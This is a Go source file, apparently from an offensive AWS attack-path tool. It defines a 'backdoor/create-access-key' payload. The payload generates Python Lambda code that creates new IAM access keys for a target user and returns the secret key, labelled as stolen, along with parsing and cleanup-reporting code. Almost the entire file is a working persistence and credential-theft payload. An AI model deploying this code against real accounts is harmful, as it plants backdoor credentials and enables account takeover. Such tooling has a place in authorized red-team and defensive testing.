// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type BackdoorCreateAccessKeyPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorCreateAccessKeyPayload{})
}

func (p *BackdoorCreateAccessKeyPayload) GetName() string {
	return "backdoor/create-access-key"
}

func (p *BackdoorCreateAccessKeyPayload) GetDescription() string {
	return "Create new access keys for an existing IAM user (does not work on roles)"
}

func (p *BackdoorCreateAccessKeyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
		payloads.TagTransportResponse,
	}
}

func (p *BackdoorCreateAccessKeyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user name or ARN to create access keys for (CreateAccessKey only works on IAM users)",
			Required:    true,
		},
	}
}

func (p *BackdoorCreateAccessKeyPayload) Validate(options map[string]string) error {
	target := options["TARGET_ARN"]
	if target == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/create-access-key payload")
	}
	if strings.HasPrefix(target, "arn:") && strings.Contains(target, ":role/") {
		return fmt.Errorf("TARGET_ARN is a role ARN — CreateAccessKey only works on IAM users")
	}
	return nil
}

func (p *BackdoorCreateAccessKeyPayload) GenerateCode(options map[string]string) (string, error) {
	code := `import json
import boto3
import os

def lambda_handler(event, context):
    iam = boto3.client('iam')

    target = os.environ.get('TARGET_ARN', '')

    # Extract username from ARN if provided
    username = target
    if target.startswith('arn:'):
        if ':user/' in target:
            username = target.split(':user/')[-1]
        elif ':role/' in target:
            return {
                'statusCode': 400,
                'body': json.dumps({
                    'status': 'error',
                    'message': 'CreateAccessKey only works on IAM users, not roles',
                    'target': target
                })
            }

    try:
        key_response = iam.create_access_key(UserName=username)
        access_key = key_response['AccessKey']

        body = {
            'status': 'success',
            'message': f'Created access key for {username}',
            'username': username,
            'access_key_id': access_key['AccessKeyId'],
            'identity_data': (
                '--- PATHFINDER_IDENTITY_DATA ---\n'
                f'NAME=stolen/{username}\n'
                f'TYPE=keys\n'
                f'ACCESS_KEY_ID={access_key["AccessKeyId"]}\n'
                f'SECRET_ACCESS_KEY={access_key["SecretAccessKey"]}\n'
                f'AUTO_SWITCH=false\n'
                '--- END_PATHFINDER_IDENTITY_DATA ---'
            )
        }

        return {
            'statusCode': 200,
            'body': json.dumps(body)
        }

    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'status': 'error',
                'message': f'Failed to create access key: {str(e)}',
                'target': username
            })
        }
`

	return code, nil
}

func (p *BackdoorCreateAccessKeyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, _ := parsePrincipalARN(options["TARGET_ARN"])

	return []modules.CreatedResource{
		{
			Type:          "iam:access-key",
			Name:          fmt.Sprintf("access-key-for-%s", principalName),
			CleanupMethod: "iam:DeleteAccessKey",
			Metadata: map[string]string{
				"username": principalName,
			},
		},
	}
}

func (p *BackdoorCreateAccessKeyPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Create Access Key Results ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("Access key created successfully!\n\n")

			if username, ok := parsedBody["username"].(string); ok {
				output.WriteString("Username: " + username + "\n")
			}

			if keyID, ok := parsedBody["access_key_id"].(string); ok {
				output.WriteString("Access Key ID: " + keyID + "\n")
			}

			if identityData, ok := parsedBody["identity_data"].(string); ok {
				output.WriteString("\n" + identityData + "\n")
			}

		} else {
			output.WriteString("Failed to create access key\n")
			if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Error: " + message + "\n")
			}
		}
	}

	return output.String(), nil
}
